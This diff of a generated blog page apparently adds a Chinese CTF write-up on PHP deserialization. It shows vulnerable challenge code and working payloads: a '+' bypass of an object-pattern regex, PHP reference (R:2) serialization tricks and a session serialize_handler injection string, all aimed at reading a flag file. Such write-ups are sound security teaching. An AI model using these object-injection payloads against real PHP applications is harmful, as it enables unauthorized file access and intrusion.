+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">class secret&#123;</span><br><span class="line">    var $file=&#x27;index.php&#x27;;</span><br><span class="line"></span><br><span class="line">    public function __construct($file)&#123;</span><br><span class="line">        $this-&gt;file=$file;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function __destruct()&#123;</span><br><span class="line">        include_once($this-&gt;file);</span><br><span class="line">        echo $flag;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function __wakeup()&#123;</span><br><span class="line">        $this-&gt;file=&#x27;index.php&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$cmd=$_GET[&#x27;cmd&#x27;];</span><br><span class="line">if (!isset($cmd))&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    if (preg_match(&#x27;/[oc]:\d+:/i&#x27;,$cmd))&#123;</span><br><span class="line">        echo &quot;Are you daydreaming?&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        unserialize($cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">//sercet in flag.php</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/[oc]:\d+:/i</span><br></pre></td></tr></table></figure>
+
+<p>这个正则表示匹配查看是否含有数字<br><strong>如何绕过呢？</strong><br>我们反序列化是需要数字的那怎么绕过呢，只需要在数字前面加上一个+<strong>号即可绕过</strong></p>
+<p>反序列化之后调用__destruct()把file赋值flag.php</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:+6:“secret”:2:&#123;s:+4:“file”;s:+8:“flag.php”;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>最好url编码一下，防止+引起问题</p>
+<hr>
+<p><strong>引用</strong></p>
+<p>PHP 在序列化数组或对象时，如果遇到相同的元素，会将其处理为引用，以节省空间和避免循环引用的问题。 </p>
+<p>用题演示一下</p>
+<p><strong>引用例题01</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line">class just4fun &#123;</span><br><span class="line">    var $enter;</span><br><span class="line">    var $secret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (isset($_GET[&#x27;pass&#x27;])) &#123;</span><br><span class="line">    $pass = $_GET[&#x27;pass&#x27;];</span><br><span class="line">    $pass=str_replace(&#x27;*&#x27;,&#x27;\*&#x27;,$pass);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$o = unserialize($pass);</span><br><span class="line"></span><br><span class="line">if ($o) &#123;</span><br><span class="line">    $o-&gt;secret = &quot;*&quot;;</span><br><span class="line">    if ($o-&gt;secret === $o-&gt;enter)</span><br><span class="line">        echo &quot;Congratulation! Here is my secret: &quot;.$flag;</span><br><span class="line">    else</span><br><span class="line">        echo &quot;Oh no... You can&#x27;t fool me&quot;;</span><br><span class="line">&#125;</span><br><span class="line">else echo &quot;are you trolling?&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<ol>
+<li>目的是让$o-&gt;secret &#x3D;&#x3D;&#x3D; $o-&gt;enter；</li>
+<li>其中·$o-&gt;secret &#x3D; “*”;</li>
+<li>但是$pass&#x3D;str_replace(‘*’,’*‘,$pass);，会把星号过滤掉变成&#x2F;+星号</li>
+</ol>
+<p>举个例子</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">class MyClass &#123;</span><br><span class="line">    public $A;</span><br><span class="line">    public $B;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = new MyClass();</span><br><span class="line">$a-&gt;B = &quot;Hello&quot;;</span><br><span class="line">$a-&gt;A =&amp; $a-&gt;B;</span><br><span class="line"></span><br><span class="line">echo $a-&gt;A;  // 输出 &quot;Hello&quot;</span><br><span class="line">echo $a-&gt;B;  // 输出 &quot;Hello&quot;</span><br><span class="line"></span><br><span class="line">$a-&gt;B = &quot;World&quot;;</span><br><span class="line"></span><br><span class="line">echo $a-&gt;A;  // 输出 &quot;World&quot;</span><br><span class="line">echo $a-&gt;B;  // 输出 &quot;World&quot;</span><br></pre></td></tr></table></figure>
+
+<p> 在上述示例中，将 <code>$a-&gt;A</code> 设置为 <code>$a-&gt;B</code> 的引用后，当修改 <code>$a-&gt;B</code> 的值时，<code>$a-&gt;A</code> 的值也会随之改变。这是因为它们引用了同一个值。 </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class just4fun &#123;</span><br><span class="line">    var $enter;</span><br><span class="line">    var $secret;</span><br><span class="line">&#125;</span><br><span class="line">$a = new just4fun();</span><br><span class="line">$a -&gt;enter=&amp;$a -&gt;secret;</span><br><span class="line">echo serialize($a);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:8:&quot;just4fun&quot;:2:&#123;s:5:&quot;enter&quot;;N;s:6:&quot;secret&quot;;R:2;&#125; </span><br></pre></td></tr></table></figure>
+
+<p>R:2代表指向序列化结果中索引号为2的值，just4fun为0，enter为1，N为2</p>
+<hr>
+<p><strong>session反序列化漏洞</strong></p>
+<p><img src="/..%5Cimages%5Csession.png"></p>
+<p><img src="/..%5Cimages%5Cs1.png"></p>
+<p><img src="/..%5Cimages%5Cs2.png"></p>
+<p><img src="/..%5Cimages%5Cs3.png"></p>
+<p><strong>本质上是存储和读取方式不一样导致的</strong></p>
+<hr>
+<p><strong>session例题01</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">/*hint.php*/</span><br><span class="line">session_start();</span><br><span class="line">class Flag&#123;</span><br><span class="line">    public $name;</span><br><span class="line">    public $her;</span><br><span class="line">    function __wakeup()&#123;</span><br><span class="line">        $this-&gt;her=md5(rand(1, 10000));</span><br><span class="line">        if ($this-&gt;name===$this-&gt;her)&#123;</span><br><span class="line">            include(&#x27;flag.php&#x27;);</span><br><span class="line">            echo $flag;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line">ini_set(&#x27;session.serialize_handler&#x27;, &#x27;php_serialize&#x27;);</span><br><span class="line">session_start();</span><br><span class="line">$_SESSION[&#x27;a&#x27;] = $_GET[&#x27;a&#x27;];</span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>
+
+<ol>
+<li>if ($this-&gt;name&#x3D;&#x3D;&#x3D;$this-&gt;her)目标是name和her的值相等，这点需要用到引用</li>
+<li>前面是默认php形式，后者是php_serialize</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Flag&#123;</span><br><span class="line">    public $name;</span><br><span class="line">    public $her;</span><br><span class="line">&#125;</span><br><span class="line">$a = new Flag();</span><br><span class="line">$a -&gt; name = &amp;$a-&gt; her;</span><br><span class="line">echo serialize($a);</span><br></pre></td></tr></table></figure>
+
+<p>结果：O:4:“Flag”:2:{s:4:“name”;N;s:3:“her”;R:2;}<br>最终payload：?a&#x3D;|O:4:“Flag”:2:{s:4:“name”;N;s:3:“her”;R:2;} </p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2024/02/23/serialize/" data-id="clu7mfpr70007wob54r00acaf" data-title="serialize" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
     <article id="post-upload" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2024/02/15/upload/" class="article-date">
@@ -163,7 +378,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2024/02/15/upload/" data-id="cltvdkkiw000hmsb5e6dhb7y0" data-title="upload" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2024/02/15/upload/" data-id="clu7mfpra000iwob56qtv6n9x" data-title="upload" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -215,7 +430,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2024/02/13/xss-11-13/" data-id="cltvdkkiv000emsb5f3fmcgj3" data-title="xss_11~13" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2024/02/13/xss-11-13/" data-id="clu7mfpra000fwob52sdv3526" data-title="xss_11~13" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -283,7 +498,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2024/02/13/xss-7-10/" data-id="cltvdkkiw000kmsb583f0da80" data-title="xss_7~10" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2024/02/13/xss-7-10/" data-id="clu7mfpra000gwob5hrac2fcy" data-title="xss_7~10" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -336,7 +551,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2024/02/13/xss4-6/" data-id="cltvdkkiz000omsb5fj32g3vk" data-title="xss4~6" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2024/02/13/xss4-6/" data-id="clu7mfpre000pwob5h9dbfp1q" data-title="xss4~6" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -393,7 +608,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2024/02/12/xss1-3/" data-id="cltvdkkiw000gmsb51b3pezic" data-title="xss1~3" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2024/02/12/xss1-3/" data-id="clu7mfpra000hwob5a59lcg5q" data-title="xss1~3" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -463,7 +678,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2024/02/11/sql16-20/" data-id="cltvdkkiu000bmsb5gu6n292j" data-title="sql16~20" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2024/02/11/sql16-20/" data-id="clu7mfpr9000dwob528wwd4fn" data-title="sql16~20" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -523,7 +738,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2024/02/09/sql11-15/" data-id="cltvdkkiu000amsb558mgcw05" data-title="sql11~15" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2024/02/09/sql11-15/" data-id="clu7mfpr8000awob5f4b10gn2" data-title="sql11~15" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -712,7 +927,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2024/02/07/sql1-10/" data-id="cltvdkkiv000fmsb5dqdi68p2" data-title="sql1~10" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2024/02/07/sql1-10/" data-id="clu7mfpr9000ewob593hchwr3" data-title="sql1~10" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -808,102 +1023,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2024/02/03/sql/" data-id="cltvdkkit0007msb59qeh9mbv" data-title="sql" class="article-share-link"><span class="fa fa-share">Share</span></a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-php" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2024/02/03/php/" class="article-date">
-  <time class="dt-published" datetime="2024-02-03T13:48:02.000Z" itemprop="datePublished">2024-02-03</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2024/02/03/php/">php</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <p><strong>用途</strong></p>
-<p>创建动态交互性网页，创建、打开、读取、写入、关闭服务器上的文件，收集表单数据，发送和接收 cookies，添加、删除、修改数据库中的数据。</p>
-<p><strong>语法</strong></p>
-<p>位于&lt;.?php?&gt;中间,句末要加分号，使用echo输出。</p>
-<p>EOF：是一种特殊的字符串，用于表示文本结束符。它通常用于多行文本块中，以避免使用大量的引号和换行符。</p>
-<p>EOF通常使用两个小于号（&lt;&lt;）和一个标识符来定义，该标识符可以是任何有效的字符串，通常是大写字母E后跟一个唯一的字符串，以指示这是一个EOF标识符。然后，在EOF标识符上方和下方放置多行文本，这些文本将被视为一个整体字符串。</p>
-<ul>
-<li></li>
-</ul>
-<p>$变量名&#x3D;…创建变量</p>
-<p>var_dump()可以输出变量的数据类型和值</p>
-<ul>
-<li></li>
-</ul>
-<p>关联数组（带有指定键的数组，每个键关联一个值）：</p>
-<p>$a&#x3D;array(“ak”&#x3D;&gt;”6”,”g”&#x3D;&gt;’y’);</p>
-<p>$a[“ak”]&#x3D;’6’</p>
-<p>遍历方法</p>
-<p>foreach（$a as $x&#x3D;&gt; $x_value）</p>
-<p>echo $x(键值)  $x_value(键对应值)</p>
-<ul>
-<li></li>
-</ul>
-<p><strong>资源</strong></p>
-<p>PHP 资源 resource 是一种特殊变量，保存了到外部资源的一个引用。</p>
-<p>由于资源类型变量保存有为打开文件、数据库连接、图形画布区域等的特殊句柄，因此将其它类型的值转换为资源没有意义。</p>
-<p>使用 get_resource_type() 函数可以返回资源（resource）类型</p>
-<ul>
-<li></li>
-</ul>
-<p>三元运算符</p>
-<p>(expr1）? (expr2) : (expr3)</p>
-<p>(expr1）正确返回  (expr2)</p>
-<p>(expr1)  错误返回 (expr3)</p>
-<ul>
-<li></li>
-</ul>
-<p>组合比较符</p>
-<p>$c &#x3D; $a &lt;&#x3D;&gt; $b;</p>
-<p>如果$a &gt; $b 则 $c&#x3D;1;</p>
-<p>如果$a &#x3D;&#x3D; $b 则 $c&#x3D;0;</p>
-<p>如果$a &lt; $b 则 $c&#x3D;-1;</p>
-<ul>
-<li></li>
-</ul>
-<p>x&#x3D;&#x3D;&#x3D;y  , x和y具有相同的键&#x2F;值对，并且顺序类型都相同,true</p>
-<ul>
-<li></li>
-</ul>
-<p>魔术常量<br>值随着其在代码的位置改变而改变</p>
-<p><em>LINE</em>   :  值为文件当前行号</p>
-<p><em>FILE</em>   ：文件的完整路径与文件名</p>
-<p><em>DIR</em>   ; 文件所在的目录。</p>
-<p><em>FUNCTION</em>  :函数名称.</p>
-<p><em>CLASS</em>  :   类的名称</p>
-<p><em>METHOD</em> : 类的方法名</p>
-<p><em>NAMESPACE</em> : 当前命名空间的名称</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2024/02/03/php/" data-id="cltvdkkiv000dmsb5anqehgdb" data-title="php" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2024/02/03/sql/" data-id="clu7mfpr9000cwob51xf6e8iy" data-title="sql" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -965,6 +1085,10 @@
       <ul>
         
           <li>
+            <a href="/2024/03/25/%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5/">无列名注入</a>
+          </li>
+        
+          <li>
             <a href="/2024/03/17/java%E7%A8%8D%E8%BF%9B%E9%98%B6/">java稍进阶</a>
           </li>
         
@@ -978,10 +1102,6 @@
         
           <li>
             <a href="/2024/03/07/ssrf/">ssrf</a>
-          </li>
-        
-          <li>
-            <a href="/2024/03/05/%E5%8E%9F%E7%94%9F%E7%B1%BB/">原生类</a>
           </li>
         
       </ul>
